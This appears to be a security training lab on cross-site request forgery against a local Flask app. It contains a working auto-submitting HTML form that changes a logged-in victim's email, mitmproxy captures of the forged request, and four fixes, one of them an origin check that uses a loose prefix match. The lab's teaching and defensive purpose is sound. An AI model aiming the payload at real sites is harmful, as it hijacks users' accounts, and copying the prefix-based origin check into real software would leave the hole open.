# Lab 01 — CSRF (Cross-Site Request Forgery)

## 📖 Explanation

**CSRF (Cross-Site Request Forgery)** forces an authenticated user to execute
unwanted actions on a web application without their knowledge or consent.

An attacker crafts a malicious page that, when visited by the victim,
automatically submits a request to the target site — using the victim's
active session cookies.

### How it works

1. Victim logs into the vulnerable app (gets a session cookie).
2. Victim visits attacker's page (without logging out).
3. Attacker's page auto-submits a form to the vulnerable app.
4. The app sees a valid session and executes the action (e.g., change email).

### Requirements

- The victim must be authenticated on the target site.
- The action must rely **only** on cookies for authentication.
- No anti-CSRF token or origin check exists.

---

## 🎯 Try It

1. **Log in** as `alice` / `password1`.

2. **Go to your Profile** (`/profile`). Notice the form to update email/bio
   — it has **no CSRF token**.

3. Create a simple HTML file (`csrf_attack.html`) in your local machine:

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Click me for a surprise!</h1>
  <form action="http://127.0.0.1:15000/profile" method="POST">
    <input type="hidden" name="email" value="hacked@attacker.com">
    <input type="hidden" name="bio" value="You got CSRF'd!">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

4. While still logged in as Alice in your browser, open this HTML file.
   (If it is served from a different origin, even better — that's the real
   attack scenario.)

5. Check your profile again — the email and bio have changed!

---

## 🔍 Packet Inspection with mitmproxy

Start mitmproxy and configure your browser (see `mitmproxy-setup.md`).
Then repeat the CSRF attack while watching traffic.

### What to look for

**1. Normal profile update request**

```http
POST /profile HTTP/1.1
Host: 127.0.0.1:15000
Cookie: session=abc123...
Content-Type: application/x-www-form-urlencoded

email=alice%40example.com&bio=hello
```

Notice:
- The `Cookie` header is sent automatically — the server trusts it.
- The POST body contains **only** the form fields, **no** CSRF token.
- No `Referer` or `Origin` validation occurs.

**2. The attack request** (from the malicious HTML page)

Watch for the POST that comes from a different origin:

```http
POST /profile HTTP/1.1
Host: 127.0.0.1:15000
Origin: null          ← not from the app's origin!
Cookie: session=abc123...    ← still sent automatically

email=hacked%40attacker.com&bio=CSRF%27d
```

Key observation: The server **cannot distinguish** this forged request from
Alice's legitimate one because the only authenticator is the session cookie,
and cookies are sent automatically by the browser regardless of origin.

### Use the addon

Run mitmproxy with the addon to see an automatic `[CSRF]` tag:

```bash
uv run mitmweb -s mitm_addon.py    # identical in PowerShell — uv resolves the venv
```

The addon flags any POST to `/profile` that lacks `csrf_token` in the body.

---

## 🛡️ Hardening

### Fix 1 — Add an anti-CSRF token

Generate a random token tied to the user session and validate it on every
state-changing POST request.

**In `app.py`: add a token generator**

```python
import secrets

@app.before_request
def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
```

**In the form template (`profile.html`):**

```html
<input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
```

**Validate before processing POST:**

```python
@app.route("/profile", methods=["GET", "POST"])
def profile():
    user = logged_in_user()
    if not user:
        return redirect(url_for("login"))
    if request.method == "POST":
        token = request.form.get("csrf_token")
        if not token or token != session.get("csrf_token"):
            return "CSRF token missing or invalid", 403
        # ... rest of the handler
```

### Fix 2 — Check the `Origin` / `Referer` header

```python
def validate_origin():
    origin = request.headers.get("Origin")
    if origin and not origin.startswith("http://127.0.0.1:15000"):
        return False
    return True
```

### Fix 3 — Use `SameSite` cookies

Set the session cookie with `SameSite=Lax` or `SameSite=Strict`:

```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

### Fix 4 — Require re-authentication for sensitive actions

For critical actions (password change, payment), prompt the user to
re-enter their password.

### Key takeaway

> Never trust that a POST request came from your own front-end.
> Validate intent with a CSRF token on every state-changing operation.